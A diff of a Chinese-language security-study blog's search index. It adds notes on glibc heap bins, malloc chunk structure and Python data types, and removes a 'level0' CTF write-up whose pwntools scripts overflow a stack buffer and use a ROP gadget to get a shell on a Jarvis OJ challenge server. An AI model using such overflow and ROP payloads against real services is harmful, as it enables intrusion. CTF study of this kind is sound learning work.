@@ -1,6 +1,76 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>bins</title>
+    <url>/2020/04/07/bins/</url>
+    <content><![CDATA[<blockquote>
+<p>bin是一个由<code>struct chunk</code>结构体组成的链表</p>
+<p> bin 用来管理被释放的<code>free chunk</code>，方便下次申请内存使用</p>
+<p> ptmalloc 一共维护了 128 个这样的 bin</p>
+</blockquote>
+<p><a href="https://www.zzl14.xyz/2020/04/07/chunk%E7%BB%93%E6%9E%84/">malloc chunk</a></p>
+<h1 id="struct-chunk结构"><a href="#struct-chunk结构" class="headerlink" title="struct chunk结构"></a>struct chunk结构</h1><p>struct chunk结构体如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">	 <span class="comment">//存放每个 fast chunk 链表头部的指针</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];  </span><br><span class="line"> 	<span class="comment">//用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到有<code>fastbinsY</code>和<code>bins</code>两种bin数组</p>
+<h2 id="fastbinY"><a href="#fastbinY" class="headerlink" title="fastbinY"></a>fastbinY</h2><ul>
+<li><p>fastbinsY数组的bin主要回收32字节<del>128字节（0x20</del>0x80）的chunk，fastbin 最多可以支持的 bin 的个数为 10 个，</p>
+</li>
+<li><p>fastbin是单链表，只用到<code>fd</code>指针,遍历顺序是<code>FIFO</code></p>
+</li>
+<li><p>prev_inuse位不置0,防止合并</p>
+<blockquote>
+<p>32位系统下</p>
+<p>第一个fast bin（index 0）包含16字节chunk的binlist，第二个fast bin（index 1）包含24字节chunk的binlist …</p>
+<p>chunk大小对应下标</p>
+<p>0          1        2         3         4          5        6          7          8        9</p>
+<p>0x10   0x18  0x20   0x28  0x30   0x38   0x40   0x48   0x50   0x58       32位</p>
+<p>0x20  0x30   0x40   0x50 0x60    0x70   0x80                                          64位</p>
+<p>但是不知道为什么fastbin有十个却好像只用了前七个（貌似与malloc初始化有关)</p>
+<p>在32位系统中，fastbin里chunk的大小范围从16到64；    –&gt;0x10到0x40</p>
+<p>在64位系统中，fastbin里chunk的大小范围从32到128;    –&gt;0x20到0x80</p>
+</blockquote>
+<p><img alt="fastbinY.png" data-src="https://i.loli.net/2020/04/08/NXfSmI3Q91ld8x6.png" class="lazyload"></p>
+<p>求fastbin的索引</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">    <span class="comment">//64位除16减去2，32位除8减去2</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><ul>
+<li><p>bins数组中的第一个 bin 是 <code>unsorted bin</code>（1个），数组中从第 2 个到第 63 个 bin 是 <code>small bin</code>（62个），64到126为<code>large bin</code>（63个）</p>
+</li>
+<li><p>三种bin都是由free chunks组成的<code>循环双链表</code></p>
+</li>
+<li><p><code>unsortedbin</code>和<code>small bin</code>采用<code>FIFO</code>(先入先出)算法,</p>
+</li>
+<li><p><code>unsorted bin</code>中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中</p>
+</li>
+<li><p><code>small bin</code>中chunk的大小依次增加两个机器字长,与fastbin一样.不过bin有62个，chunk大小从<code>0x10</code>到<code>0x1f8</code>(32位)<code>0x20</code>到<code>0x3f0</code>（64位）</p>
+</li>
+<li><p><code>largin bin</code> 中 chunk 的大小不是固定的，而是有一个范围。其中的顺序是<code>按从大到小排序</code>的,大的chunk放在一个链表的头部，最小的chunk放在尾部；相同大小的chunk按照最近使用顺序排序</p>
+</li>
+<li><p>在这63个<code>large bin</code>中，</p>
+<ul>
+<li><p>前32个大bin按以64字节步长为间隔，即第一个大bin中chunk大小为512〜575字节，第二个大bin中chunk大小为576〜 639字节。紧随其后的16个大bin先以512字节步长为间隔；</p>
+</li>
+<li><p>之后的8个bin以步长4096为间隔；</p>
+</li>
+<li><p>再之后的4个bin以32768字节为间隔；</p>
+</li>
+<li><p>之后的2个bin以262144字节为间隔；</p>
+</li>
+<li><p>剩下的chunk就放在最后一个大bin中。</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>  <img alt="QQ截图20200408174926.png" data-src="https://i.loli.net/2020/04/08/e5KBEuVM3714tDn.png" class="lazyload"></p>
+<h2 id="FIFO"><a href="#FIFO" class="headerlink" title="FIFO"></a>FIFO</h2><blockquote>
+<p>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
     <title>canary</title>
     <url>/2019/11/08/canary/</url>
     <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
@@ -38,223 +108,107 @@
       </tags>
   </entry>
   <entry>
-    <title>docker基础</title>
-    <url>/2020/02/16/docker%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。</span><br></pre></td></tr></table></figure>
-
-<p>针对简单操作理解一下DOCKER</p>
-<p>拉取一个 DOCKER 镜像，我们可以用如下命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>
-
-<p>image_name就是指的镜像</p>
-<p>pull就是拉取一个镜像</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker镜像	可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure>
-
-<h1 id="如何安装DOCKER"><a href="#如何安装DOCKER" class="headerlink" title="如何安装DOCKER?"></a>如何安装DOCKER?</h1><pre><code>docker rmi image_name        删除镜像
-
-docker run --name container-name -d image-name    运行容器
---name：自定义容器名
--d：表示后台运行
-
-docker ps（查看运行中的容器）；    加上-a；可以查看所有容器
-
-docker stop container-name/container-id    停止当前运行的指定容器
-
-启动    docker start container-name/container-id    启动容器
-
-删除    docker rm container-id    删除指定容器
-
-端口映射    -p 6379:6379
-如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis    
--p:主机端口映射到容器内部的端口
-
-
- docker中run和start的区别
-docker run 后面指定的是一个镜像
-
-而docker start指定的是一个容器
-
-docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><p>#实例运行、<br>    运行交互式的容器</p>
-<pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash
--t: 在新容器内指定一个伪终端或终端。
--i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>​<br>停止容器<br>​    docker stop </p>
-<p>exit 命令或者使用 CTRL+D 来退出容器。</p>
-<p>后台启动容器</p>
-<pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash
- -d 参数时，容器启动后会进入后台
- -i: 允许你对容器内的标准输入 (STDIN) 进行交互。    
- -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p>
-<pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：
-
-docker attach
-
-docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。
-
-例如
-docker attach 4b6771050406
-docker exec -it b26d4f3e2cac /bin/bash
-
-删除容器使用 docker rm 命令：
-docker rm -f 1e560fca3906</code></pre><h2 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images 查看镜像"></a>docker images 查看镜像</h2><pre><code>REPOSITORY：表示镜像的仓库源
-TAG：镜像的标签
-IMAGE ID：镜像ID
-CREATED：镜像创建时间
-SIZE：镜像大小</code></pre><p>我们可以从 Docker Hub 网站来搜索镜像</p>
-<p>面是一段简单的Dockerfile的例子：</p>
-<pre><code>FROM python:2.7
-MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;
-COPY . /app
-WORKDIR /app
-RUN pip install -r requirements.txt
-EXPOSE 5000
-ENTRYPOINT [&quot;python&quot;]
-CMD [&quot;app.py&quot;]
-我们可以分析一下上面这个过程：
-
-1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像
-2、显示维护者的信息
-3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;
-4、指定工作路径为 /app
-5、安装依赖包
-6、暴露 5000 端口
-7、启动 app
-这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>chunk结构</title>
-    <url>/2020/04/07/chunk%E7%BB%93%E6%9E%84/</url>
-    <content><![CDATA[<h1 id="内存堆块结构"><a href="#内存堆块结构" class="headerlink" title="内存堆块结构"></a>内存堆块结构</h1><blockquote>
-<p>malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示</p>
-</blockquote>
-<blockquote>
-<p>结构定义如下</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>prev_size仅在前一个堆块（较低地址）是<code>free</code>状态才生效。</li>
-<li>size指的是本chunk的大小即为图中<code>chunk</code>到<code>nextchunk</code>的大小</li>
-<li>fd是指向下一个（非物理相邻）被<code>free</code>的 chunk</li>
-<li>bk 指向上一个（非物理相邻）被<code>free</code>的 chunk</li>
-<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块</li>
-<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块</li>
-</ul>
-<p><img alt data-src="https://i.loli.net/2020/04/07/Me76wTjuBZtpI8y.jpg" class="lazyload"></p>
-<h2 id="各部分详解"><a href="#各部分详解" class="headerlink" title="各部分详解"></a>各部分详解</h2><ul>
-<li><p><strong>prev_size</strong>只有<code>chunk 被free</code>空闲的时候才使用，如果前一个chunk未被free，前一个chunk可以覆写到presize位，正如图中所示，chunk可以写<strong><em>内容（user data）</em></strong>到下一个堆块的<code>pre_size</code> <strong>这就是 chunk 中的空间复用</strong></p>
-<blockquote>
-<p>这样看起来好像size位才是chunk的开始。？</p>
-<p>但是chunk块的地址从这里开始</p>
-</blockquote>
-</li>
-<li><p><strong>size</strong>记录的大小一般是 <strong>2 * SIZE_SZ</strong> 的最小整数倍。</p>
-<blockquote>
-<p>若<code>malloc(n)</code> 则<code>size</code>=<strong>(n+SIZE_SZ)再补齐</strong>，</p>
-<p>我是看做<code>data</code>部分大小加上<code>size</code>位的大小再补齐</p>
-<p> <strong>SIZE_SZ</strong>= 4（32位系统）或8（64位系统）</p>
-<p>另外size后三位有特殊用途，所以size的真正大小要将后三位取0</p>
-<ul>
-<li><p>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p>
-</li>
-<li><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
-</li>
-<li><p>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p>
-</li>
-</ul>
-</blockquote>
-</li>
-<li><p><strong>fd，bk</strong></p>
-<blockquote>
-<p>malloc成功时返回的地址就是fd的地址</p>
-<p>chunk 处于分配状态时，从 fd 字段开始是用户的数据,<code>chunk 被free</code>后才发挥作用</p>
-<ul>
-<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
-<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
-</ul>
-</blockquote>
-</li>
-<li><p><strong>fd_nextsize， bk_nextsize</strong><code>chunk 被free</code>的时候才使用，用于<code>large chunk</code>。</p>
-<blockquote>
-<ul>
-<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
-<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
-</ul>
-</blockquote>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>堆</category>
-      </categories>
-      <tags>
-        <tag>-chunk结构 -malloc -linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>level0</title>
-    <url>/2019/08/08/level0/</url>
+    <title>python基本数据类型</title>
+    <url>/2019/08/08/python/</url>
     <content><![CDATA[<a id="more"></a>
 
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
-<p>一</p>
-<p>`</p>
-<pre><code>#coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
-]]></content>
+
+
+
+<p>python在写代码时不用声明变量</p>
+<pre><code>在了解基本数据类型的时候，我们需要了解基本数据类型有哪些？
+数字int、布尔值bool、字符串str、列表list、元组tuple、字典dict等，
+其中包括他们的基本用法和其常用的方法，这里会一一列举出来
+然后我们还需要了解一些运算符，
+因为这些基本数据类型常常会用于一些运算等等</code></pre><p>二、基本数据类型</p>
+<p>1、数字  —&gt; int类</p>
+<p>　　    当然对于数字，Python的数字类型有int整型、long长整型、float浮点数、complex复数、以及布尔值（0和1），这里只针对int整型进行介绍学习。</p>
+<p>　　　　在Python2中，整数的大小是有限制的，即当数字超过一定的范围不再是int类型，而是long长整型，而在Python3中，无论整数的大小长度为多少，统称为整型int。</p>
+<p>2、布尔值  </p>
+<p>—&gt;bool类
+　　</p>
+<p>对于布尔值，只有两种结果即True和False，其分别对应与二进制中的0和1。</p>
+<p>而对于真即True的值太多了，我们只需要了解假即Flase的值有哪些</p>
+<p>—》</p>
+<p>None、空（即 [ ]/( ) /“ “/{ }）、0；</p>
+<p>3、字符串  </p>
+<p>—&gt;str类</p>
+<p>　　　     关于字符串是Python中最常用的数据类型，其用途也很多，我们可以使用单引号 ‘’或者双引号“”来创建字符串。</p>
+<p>　　　　   字符串是不可修改的。所有关于字符我们可以从 索引、切片、长度、遍历、删除、分割、清除空白、大小写转换、判断以什么开头等方面对字符串进行介绍。</p>
+<p>#一</p>
+<pre><code>创建字符串    s=&quot;abcda&quot;    或    s=&apos;abcda&apos;
+
+截取字符串    s[1]=&apos;b&apos;    s[0,-2]=&apos;abc&apos;
+             #从第一个到倒数第二个，不包含倒数第二个</code></pre><p>#二</p>
+<p>索引         index()、find()</p>
+<p>ndex()与find()的不同之处在于：若索引的该字符或者序列不在字符串内，对于index–》ValueError: substring not found，而对于find –&gt;返回 -1</p>
+<pre><code>一.        s.index(&quot;a&quot;,2)    =    4
+#index--&gt;获取索引，第二个参数指定获取该子字符或者子序列的第几个
+
+        s.find(&apos;a&apos;,3)    =    -1</code></pre><p>#三<br>长度        len()</p>
+<pre><code>len(s)    =    5</code></pre><p>删除  del</p>
+<pre><code>#删除字符串，也是删除变量
+&gt;&gt;&gt; name =&quot;little-five&quot;
+&gt;&gt;&gt; del name</code></pre><p> 判断字符串内容  isalnum()、isalpha()、isdigit()　</p>
+<pre><code>isalnum()    #判断是否全为数字
+isalpha()    #判断是否全为字母
+isdigit()    #判断是否全为数字或者字母
+
+返回值为bool型，是为True，否为Flase</code></pre><p> 大小写转换  capitalize()、lower()、upper()、title()、casefold()</p>
+<pre><code>#大小写的互相转换    s.swapcase()
+#首字母大写        s.capitalize()
+#全部转为小写        s.lower()
+#全部转为大写        s.upper()</code></pre><p>jion方法</p>
+<pre><code>#join--&gt; join(): 连接字符串数组。
+将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串
+
+#字符串
+name =&quot;littefive&quot;
+&quot;-&quot;.join(name)
+&apos;l-i-t-t-e-f-i-v-e&apos;
+
+#列表
+info = [&quot;xiaowu&quot;,&quot;say&quot;,&quot;hello&quot;,&quot;world&quot;]
+&quot;--&quot;.join(info)
+&apos;xiaowu--say--hello--world&apos;</code></pre><p>　4、列表    list类<br>　    列表是由一系列特定元素顺序排列的元素组成的，它的元素可以是任何数据类型即数字、字符串、列表、元组、字典、布尔值等等，同时其元素也是可修改的。</p>
+<pre><code>names = [&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;]
+ #或者
+names = list([&apos;little-five&quot;,&quot;James&quot;,&quot;Alex&quot;])</code></pre><p>#一.<br>    #索引    从0开始，而不是从一开始<br>    name =[“xiaowu”,”little-five”,”James”]<br>    print(name[0:-1])<br><br><br>    #切片    负数为倒数第几个，其为左闭右开，<br>        如不写，前面表示包含前面所有元素,后面则表示后面所有元素<br>    m1 =name[1:]<br>    print(m1)<br>    #输出为–&gt;[‘little-five’, ‘James’]<br>    m2 =name[:-1]<br>    print(m2)<br>    #输出为–&gt;[‘xiaowu’, ‘little-five’]</p>
+<p>#二.<br>    #一、将其他列表元素添加至列表内<br>        name.extend([“alex”,”green”])<br><br>    #二、将字符串元素添加到列表内<br>        name.extend(“hello”)<br><br>    #三、将字典元素添加至列表内，注：字典的key<br>        name.extend({“hello”:”world”})</p>
+<p>　pop()        取出</p>
+<pre><code>#pop()--取出，可将取出的值作为字符串赋予另外一个变量
+
+name =[&quot;xiaowu&quot;,&quot;little-five&quot;,&quot;James&quot;]
+special_name =name.pop(1)</code></pre><p>#三<br>5、元组        tuple类</p>
+<p>元组即为不可修改的列表。<br>其于特性跟list相似。其使用圆括号而不是方括号来标识。 </p>
+<pre><code>#元组
+name = (&quot;little-five&quot;,&quot;xiaowu&quot;)
+print(name[0])</code></pre><p>#四.<br>字典        dict类
+　　　 </p>
+<p>字典为一系列的键-值对，每个键值对用逗号隔开，每个键都与一个值相对应，可以通过使用键来访问对应的值。无序的。
+　</p>
+<p>键的定义必须是不可变的，即可以是数字、字符串也可以是元组，还有布尔值等。</p>
+<p>而值的定义可以是任意数据类型。</p>
+<pre><code>#字典的定义
+
+info ={
+    1:&quot;hello world&quot;,  #键为数字
+    (&quot;hello world&quot;):1, #键为元组
+    False:{&quot;name&quot;:&quot;James&quot;},
+    &quot;age&quot;:22
+}    </code></pre><p>遍历        items、keys、values</p>
+<pre><code>info ={
+   &quot;name&quot;:&quot;little-five&quot;,
+   &quot;age&quot;:22,
+   &quot;email&quot;:&quot;99426353*@qq,com&quot;
+}
+#键
+for key in info:
+    print(key)
+    print(info.keys())
+    #输出为：    dict_keys([&apos;name&apos;, &apos;age&apos;, &apos;email&apos;])</code></pre><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#键值对</span><br><span class="line">print(info.items())</span><br><span class="line">#输出为:	dict_items([('name', 'little-five'), </span><br><span class="line">('age', 22), ('email', '99426353*@qq,com')])</span><br><span class="line"></span><br><span class="line">#值</span><br><span class="line">print(info.values())</span><br><span class="line">#输出为：dict_values(['little-five', 22, '99426353*@qq,com'])</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
-        <tag>做题题解</tag>
+        <tag>语言基础</tag>
       </tags>
   </entry>
   <entry>
@@ -380,107 +334,138 @@ print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂�
       </tags>
   </entry>
   <entry>
-    <title>python基本数据类型</title>
-    <url>/2019/08/08/python/</url>
+    <title>chunk结构</title>
+    <url>/2020/04/07/chunk%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[<h1 id="内存堆块结构"><a href="#内存堆块结构" class="headerlink" title="内存堆块结构"></a>内存堆块结构</h1><blockquote>
+<p>malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示</p>
+</blockquote>
+<blockquote>
+<p>结构定义如下</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>prev_size仅在前一个堆块（较低地址）是<code>free</code>状态才生效。</li>
+<li>size指的是本chunk的大小即为图中<code>chunk</code>到<code>nextchunk</code>的大小</li>
+<li>fd是指向下一个（非物理相邻）被<code>free</code>的 chunk</li>
+<li>bk 指向上一个（非物理相邻）被<code>free</code>的 chunk</li>
+<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块</li>
+<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块</li>
+</ul>
+<p><img alt="fullsizerender(2).jpg" data-src="https://i.loli.net/2020/04/08/kfoGZs6wjAFv9lz.jpg" class="lazyload"></p>
+<blockquote>
+<p>简单来讲chunk分为正在使用的chunk：<code>allocated chunk</code>和被free的chunk:<code>free chunk</code></p>
+<p>正在使用的chunk如图所示，数据从fd开始写，可能写到下一个chunk的prev_use位</p>
+<p>可以说除了size，其他字段都用来写数据，在chunk被free才会发挥各个字段的作用</p>
+</blockquote>
+<h2 id="各部分详解"><a href="#各部分详解" class="headerlink" title="各部分详解"></a>各部分详解</h2><ul>
+<li><p><strong>prev_size</strong>只有当该chunk的物理相邻的前一地址chunk是空闲的话，该字段在本chunk中才有用，用来记录前一个chunk 的大小 (包括chunk头)。只有<code>chunk 被free</code>空闲的时候才使用，如果前一个chunk未被free，前一个chunk可以覆写到presize位，正如图中所示，chunk可以写<strong><em>内容（user data）</em></strong>到下一个堆块的<code>pre_size</code> <strong>这就是 chunk 中的空间复用</strong></p>
+<blockquote>
+<p>这样看起来好像size位才是chunk的开始。？</p>
+<p>但是chunk块的地址从这里开始</p>
+</blockquote>
+</li>
+<li><p><strong>size</strong>记录当前chunk的大小,大小一般是 <strong>2 * SIZE_SZ</strong> 的最小整数倍。</p>
+<blockquote>
+<p>若<code>malloc(n)</code> 则<code>size</code>=<strong>(n+SIZE_SZ)再补齐</strong>，</p>
+<p>我是看做<code>data</code>部分大小加上<code>size</code>位的大小再补齐</p>
+<p> <strong>SIZE_SZ</strong>= 4（32位系统）或8（64位系统）</p>
+<p>另外size后三位有特殊用途，所以size的真正大小要将后三位取0</p>
+<ul>
+<li><p>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</p>
+</li>
+<li><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</p>
+</li>
